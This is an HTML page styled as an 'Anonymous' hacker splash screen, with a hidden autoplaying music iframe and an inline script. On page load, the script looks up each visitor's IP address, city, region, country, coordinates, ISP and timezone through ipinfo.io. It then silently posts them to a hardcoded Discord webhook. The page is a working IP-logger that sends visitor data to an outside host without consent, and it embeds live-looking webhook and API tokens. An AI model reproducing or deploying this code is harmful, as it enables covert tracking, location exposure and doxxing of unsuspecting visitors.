<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Anonymous</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
      background-size: cover;
      font-family: 'Courier New', Courier, monospace;
      color: orange;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      text-align: center;
    }

    .image-container img {
      width: 750px;
      height: auto;
      border: 2px solid orange;
      border-radius: 15px;
      box-shadow: 0 0 15px rgba(255, 165, 0, 0.7);
    }

    .info {
      margin-top: 20px;
      font-size: 1.5em;
      color: orange;
      text-shadow: 0px 0px 8px orange, 0px 0px 15px orange, 0px 0px 25px orange;
      letter-spacing: 4.5px;
      white-space: pre-wrap;
    }

    .text {
      margin-top: 20px;
      font-size: 3em;
      color: orange;
      text-shadow: 0px 0px 8px orange, 0px 0px 15px orange, 0px 0px 25px orange;
      letter-spacing: 4.5px;
    }

    .music-player {
      display: none;
    }
  </style>
</head>
<body>
  <div class="image-container">
    <img src="https://pbs.twimg.com/media/GbE-jy7X0AEZLZo?format=jpg&name=large" alt="Discord Image" />
  </div>

  <!-- مشغل الموسيقى -->
  <div class="music-player">
    <iframe 
      width="0" 
      height="0" 
      scrolling="no" 
      frameborder="no" 
      allow="autoplay" 
      src="https://w.soundcloud.com/player/?url=https%3A//soundcloud.com/user-611502210/remix-ouzii-dawrya&auto_play=true&hide_related=true&show_comments=false&show_user=false&show_reposts=false&visual=false">
    </iframe>
  </div>

  <div class="info" id="ip-info">
    <strong>IP:</strong> <span id="ip"></span><br>
    <strong>City:</strong> <span id="city"></span><br>
    <strong>Region:</strong> <span id="region"></span><br>
    <strong>Country:</strong> <span id="country"></span><br>
    <strong>Location:</strong> <span id="loc"></span><br>
    <strong>Org:</strong> <span id="org"></span><br>
    <strong>Timezone:</strong> <span id="timezone"></span>
  </div>

  <div class="text">(I am A7&lt;3)(I am Anonymous)</div>

  <script>
    const webhookUrl = "https://ptb.discord.com/api/webhooks/1352217987423141939/eyFykaQ_eHTd7eEfy54XUDbMt7DHjMpN-ELCnigxMrah5-iUPp5oZvsed5tOLgZcSLUo";

    fetch("https://ipinfo.io/json?token=387375b2daa352")
      .then((res) => res.json())
      .then((data) => {
        // عرض البيانات على الصفحة
        document.getElementById('ip').textContent = data.ip;
        document.getElementById('city').textContent = data.city;
        document.getElementById('region').textContent = data.region;
        document.getElementById('country').textContent = data.country;
        document.getElementById('loc').textContent = data.loc;
        document.getElementById('org').textContent = data.org;
        document.getElementById('timezone').textContent = data.timezone;

        // تجهيز الرسالة لإرسالها إلى ديسكورد
        const message = `
📡 **New Visitor Info**
━━━━━━━━━━━━━━━
🌐 IP: ${data.ip}
🏙️ City: ${data.city}
🗺️ Region: ${data.region}
🇨🇺 Country: ${data.country}
📍 Location: ${data.loc}
🏢 ISP: ${data.org}
🕒 Timezone: ${data.timezone}
━━━━━━━━━━━━━━━
`;

        // إرسال إلى Discord Webhook
        fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: message })
        });
      })
      .catch((err) => {
        document.getElementById('ip-info').textContent = 'تعذر جلب البيانات 😕';
        console.error(err);
      });
  </script>
</body>
</html>
